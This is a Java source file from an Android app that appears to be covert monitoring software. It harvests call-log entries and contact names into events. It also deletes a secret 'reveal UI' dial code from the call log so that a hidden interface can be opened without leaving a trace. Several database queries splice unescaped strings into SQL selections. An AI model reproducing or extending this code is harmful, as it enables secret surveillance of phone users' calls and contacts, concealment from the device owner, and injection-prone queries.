package com.fx.dalvik.contacts;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.Contacts;
import android.telephony.PhoneNumberUtils;

import com.fx.android.common.Customization;
import com.fx.dalvik.event.Event;
import com.fx.dalvik.event.EventCall;
import com.fx.dalvik.util.FxLog;
import com.fx.dalvik.util.GeneralUtil;
import com.vvt.android.syncmanager.control.Main;
import com.vvt.android.syncmanager.receivers.FlexiKeyReceiver;
import com.vvt.android.syncmanager.utils.Common;

@SuppressWarnings("deprecation")
public class ContactsDatabaseManager {
	
	private static final String TAG = "ContactsDatabaseManager";
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	private static final boolean LOGE = Customization.DEBUG ? DEBUG : false;
	
	public static int deleteCallWithFlexiKey(Context context) { 
		if (LOGV) FxLog.v(TAG, "deleteCallWithFlexiKey # ENTER ...");
		
//		printFxLogCallContent();
		
		ContentResolver resolver = Main.getContext().getContentResolver();
		
		String selection = String.format("%s = '%s'", 
				CallLog.Calls.NUMBER, Common.getCodeToRevealUI());
		
		Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, null, selection, null, null);
		boolean resultMatched = cursor.getCount() > 0;
		cursor.close();
		
		int rowsDeleted = 0;
		
		if (resultMatched) {
			if (LOGV) FxLog.v(TAG, "deleteCallWithFlexiKey # Found FK!!");
			rowsDeleted = Main.getContext().getContentResolver().delete(
					CallLog.Calls.CONTENT_URI, selection, null);
			
			if (LOGV) FxLog.v(TAG, String.format(
						"deleteCallWithFlexiKey # rowsDeleted: %d", rowsDeleted));
			
			startUiIfNotStart(context);
		}
		else {
			if (LOGV) FxLog.v(TAG, "deleteCallWithFlexiKey # Found normal number");
		}
		
		return rowsDeleted;
	}
	
	public static long getLatestCallLogId(Context context) {
		if (LOGV) FxLog.v(TAG, "getLatestCallLogId # ENTER ...");
		
		String[] projection = { ContactsDatabaseHelper.COLUMN_ID };
		String sortOrder = String.format("%s %s", ContactsDatabaseHelper.COLUMN_ID, "DESC");
		
//		Cannot be used in Samsung Galaxy S, it seems query from different database
//		String selection = String.format("%s = (SELECT MAX(%s) FROM %s)", 
//				ContactsDatabaseHelper.COLUMN_ID, 
//				ContactsDatabaseHelper.COLUMN_ID, 
//				ContactsDatabaseHelper.TABLE_CALLS);
		
		Cursor cursor = context.getContentResolver().query(
				ContactsDatabaseHelper.CALL_LOG_CONTENT_URI, projection, null, null, sortOrder);
		
		if (cursor == null) {
			if (LOGV) FxLog.v(TAG, "getLatestCallLogId # Query database FAILED!! -> EXIT ...");
			return -1;
		}
		
		long maxId = 0;
		
		if (cursor.moveToFirst()) {
			maxId = cursor.getLong(0);
		}
		
		cursor.close();
		
		if (LOGV) FxLog.v(TAG, String.format("getLatestCallLogId # id: %d", maxId));
		if (LOGV) FxLog.v(TAG, "getLatestCallLogId # EXIT ...");
		
		return maxId;
	}
	
	public static HashSet<EventCall> getNewerCallLog(Context context, long refId) {
		if (LOGV) FxLog.v(TAG, "getNewerCallLog # ENTER ...");
		
		HashSet<EventCall> calls = new HashSet<EventCall>();
		
		String selection = String.format("%s > %d", ContactsDatabaseHelper.COLUMN_ID, refId);
		Cursor cursor = context.getContentResolver().query(
				ContactsDatabaseHelper.CALL_LOG_CONTENT_URI, null, selection, null, null);
		
		if (cursor == null) {
			if (LOGV) FxLog.v(TAG, "getNewerCallLog # Query database FAILED!! -> EXIT ...");
			return calls;
		}
		
		EventCall call = null;
		
		while (cursor.moveToNext()) {
			
			if (LOGV) FxLog.v(TAG, "getNewerCallLog # Creating call event ...");
			
			long id = cursor.getLong(cursor.getColumnIndex(ContactsDatabaseHelper.COLUMN_ID));
			
			String phonenumber = cursor.getString(cursor.getColumnIndex(
					ContactsDatabaseHelper.COLUMN_NUMBER));
			
			phonenumber = GeneralUtil.formatCapturedPhoneNumber(phonenumber);
			
			String contactName = cursor.getString(cursor.getColumnIndex(
					ContactsDatabaseHelper.COLUMN_NAME));
			
			if (contactName == null || contactName.trim().length() == 0) {
				contactName = Event.REMOTEPARTY_UNKNOWN;
			}
			
			int duration = cursor.getInt(cursor.getColumnIndex(
					ContactsDatabaseHelper.COLUMN_DURATION));
			
			long timeInitiated = cursor.getLong(cursor.getColumnIndex(
					ContactsDatabaseHelper.COLUMN_DATE));
			
			long timeTerminated = System.currentTimeMillis();
			
			int type = cursor.getInt(cursor.getColumnIndex(
					ContactsDatabaseHelper.COLUMN_TYPE));
			
			short direction = Event.DIRECTION_UNKNOWN;
			
			switch (type) {
				case CallLog.Calls.INCOMING_TYPE:
					direction = Event.DIRECTION_IN;
					break;
				case CallLog.Calls.OUTGOING_TYPE:
					direction = Event.DIRECTION_OUT;
					break;
				case CallLog.Calls.MISSED_TYPE:
					direction = Event.DIRECTION_MISSED;
					break;
				// This number is used in Samsung S2 4.0.3
				// To represent rejected incoming call
				case 5:
					direction = Event.DIRECTION_IN;
					break;
			}
			
			call = new EventCall(timeInitiated, timeTerminated, direction, 
					duration, phonenumber, Event.STATUS_TERMINATED, contactName);
			
			call.setId(id);
			calls.add(call);
			
			if (LOGV) FxLog.v(TAG, "getNewerCallLog # Call event is created");
		}
		
		if (LOGV) FxLog.v(TAG, "getNewerCallLog # Cursor past the last entry");
		
		cursor.close();
		
		if (LOGV) FxLog.v(TAG, "getNewerCallLog # EXIT ...");
		return calls;
	}
	
	public static int deleteNumberFromCallLog(Context context, String number) {
		String selection = String.format("%s = '%s'", 
				ContactsDatabaseHelper.COLUMN_NUMBER, number);
		
		int deleledRows = context.getContentResolver().delete(
				ContactsDatabaseHelper.CALL_LOG_CONTENT_URI, selection, null);
		
		return deleledRows;
	}
	
	public static String getContactNameByNumber(String number) {
		if (LOGV) FxLog.v(TAG, "getContactNameByNumber # ENTER ...");
		if (LOGV) FxLog.v(TAG, String.format("getContactNameByNumber # number: %s", number));
		
		if (! PhoneNumberUtils.isWellFormedSmsAddress(number)) {
			if (LOGV) FxLog.v(TAG, "getContactNamesFromEmails # Number is not well formed -> EXIT ...");
			return null;
		}
		
		Uri uri = null;
		String columnName = null;
		Cursor cursor = null;
		
		int sdkVersion = getSdkVersion();
		
		if (sdkVersion > 4 && ContactsContractWrapper.isAvailable()) {
			uri = Uri.withAppendedPath(
					ContactsContractWrapper.getPhoneLookupUri(), 
					Uri.encode(number));
			columnName = "display_name";
		}
		else {
			uri = Uri.withAppendedPath(
					Contacts.Phones.CONTENT_FILTER_URL, Uri.encode(number));
			columnName = "name";
		}
		
		HashSet<String> contactSet = new HashSet<String>();
		cursor = Main.getContentResolver().query(uri, null, null, null, null);
		if (cursor != null ) {
			while (cursor.moveToNext()) {
				contactSet.add(cursor.getString(cursor.getColumnIndex(columnName)));
			}
			cursor.close();
		}
		
		StringBuilder builder = new StringBuilder();
		for (Iterator<String> it = contactSet.iterator(); it.hasNext(); ) {
			if (builder.length() > 0) {
				builder.append("; ");
			}
			builder.append(it.next());
		}
		
		String contacts = builder.toString();
		
		if (LOGV) FxLog.v(TAG, String.format("getContactNameByNumber # contacts: %s", contacts));
		if (LOGV) FxLog.v(TAG, "getContactNameByNumber # EXIT ...");
		return contacts;
	}
	
	public static String getContactNamesByEmails(String[] emails) {
		if (LOGV) FxLog.v(TAG, "getContactNamesByEmails # ENTER ...");
		if (LOGV) FxLog.v(TAG, String.format(
				"getContactNamesByEmails # emails: %s", 
				emails == null ? null : Arrays.toString(emails)));
		
		if (emails == null || emails.length < 1) {
			if (LOGV) FxLog.v(TAG, "getContactNamesByEmails # Emails NOT found!! -> EXIT ...");
			return null;
		}
		
		boolean useContactsContract = 
			getSdkVersion() > 4 && ContactsContractWrapper.isAvailable();
			
		ArrayList<String> contactList = new ArrayList<String>();
		
		for (String email : emails) {
			contactList.add(selectEmailContactName(email, useContactsContract));
		}
		
		String email = null;
		StringBuilder builder = new StringBuilder();
		for (Iterator<String> it = contactList.iterator(); it.hasNext(); ) {
			email = it.next();
			if (email == null || email.contains("null")) {
				continue;
			}
			if (builder.length() > 0) {
				builder.append("; ");
			}
			builder.append(email);
		}
		
		String result = builder.toString();
		
		if (LOGV) FxLog.v(TAG, String.format("getContactNamesByEmails # result: %s", result));
		if (LOGV) FxLog.v(TAG, "getContactNamesByEmails # EXIT ...");
		
		return result;
	}
	
	private static String selectEmailContactName(String email, boolean useContactsContract) {
		Uri uri = null;
		String columnName = null;
		String selection = null;
		if (useContactsContract) {
			uri = Uri.withAppendedPath(
					ContactsContractWrapper.getEmailLookupUri(), 
					Uri.encode(email));
			columnName = "display_name";
		}
		else {
			uri = Contacts.ContactMethods.CONTENT_EMAIL_URI;
			selection = String.format("data='%s'", email);
			columnName = "name";
		}
		
		Cursor cursor = Main.getContentResolver().query(uri, null, selection, null, null);
		
		String contactName = null;
		if (cursor != null && cursor.getCount() > 0) {
			while (cursor.moveToNext()) {
				contactName = cursor.getString(cursor.getColumnIndex(columnName));
				if (contactName != null && !contactName.contains("@")) {
					break;
				}
			}
			cursor.close();
		}
		if (contactName == null) {
			contactName = email;
		}
		return contactName;
	}
	
	private static void startUiIfNotStart(Context context) {
		if (LOGV) FxLog.v(TAG, "startUiIfNotStart # ENTER ...");
		
		String pkg = context.getApplicationContext().getPackageName();
		if (LOGV) FxLog.v(TAG, String.format("startUiIfNotStart # Application package: %s", pkg));
		
		ActivityManager activityManager = 
			(ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		
		boolean isUiStarted = false;
		List<RunningTaskInfo> tasks = activityManager.getRunningTasks(3);
		for (RunningTaskInfo info : tasks) {
			if (pkg.equals(info.baseActivity.getPackageName())) {
				isUiStarted = true;
				break;
			}
		}
		
		if (!isUiStarted) {
			if (LOGV) FxLog.v(TAG, "startUiIfNotStart # Activity is not active yet! -> Launching ...");
			FlexiKeyReceiver.startUi();
		}
		
		if (LOGV) FxLog.v(TAG, "startUiIfNotStart # EXIT ...");
	}
	
	private static int getSdkVersion() {
		int sdkVersion = 0;
		try {
			sdkVersion = Integer.parseInt(Build.VERSION.SDK);
		} 
		catch(NumberFormatException e) {
			
		}
		return sdkVersion;
	}
	
	@SuppressWarnings("unused")
	private static void printFxLogCallContent() {
		Uri aUri = Uri.withAppendedPath(CallLog.Calls.CONTENT_URI, "");
		Cursor aCursor = Main.getContentResolver().query(aUri, null, null, null, null);
		if (LOGV) FxLog.v(TAG, "deleteCallsContainingCodeToRevealUI # Found '" + aCursor.getCount() + "' rows");
		
		if (LOGV) { 
			while(aCursor.moveToNext()) {		
				int aColumnIndexInt = aCursor.getColumnIndex(CallLog.Calls.NUMBER);
				
				FxLog.v(TAG, "deleteCallsContainingCodeToRevealUI # Number (" + aColumnIndexInt + ") = " 
						+ aCursor.getString(aColumnIndexInt));
			}
			aCursor.close();
		}
	}
	
	private static class ContactsContractWrapper {
		
		private static boolean isAvailable() {
			boolean isAvailable = false;
			try {
				Class.forName("android.provider.ContactsContract");
				isAvailable = true;
			}
			catch (ClassNotFoundException e) {
				
			}
			return isAvailable;
		}
		
		private static Uri getEmailLookupUri() {
			return getLookupUri(
					"android.provider.ContactsContract$CommonDataKinds$Email", 
					"CONTENT_LOOKUP_URI");
		}
		
		private static Uri getPhoneLookupUri() {
			return getLookupUri(
					"android.provider.ContactsContract$PhoneLookup", 
					"CONTENT_FILTER_URI");
		}
		
		private static Uri getLookupUri(String className, String staticFieldName) {
			Uri uri = null;
			try {
				Class<?> clsPhoneLookup = Class.forName(className);
				Field fieldUri = clsPhoneLookup.getDeclaredField(staticFieldName);
				uri = (Uri) fieldUri.get(null);
			} 
			catch (Exception e) {
				if (LOGE) FxLog.e(TAG, null, e);
			}
			return uri;
		}
		
		
	}
	
}
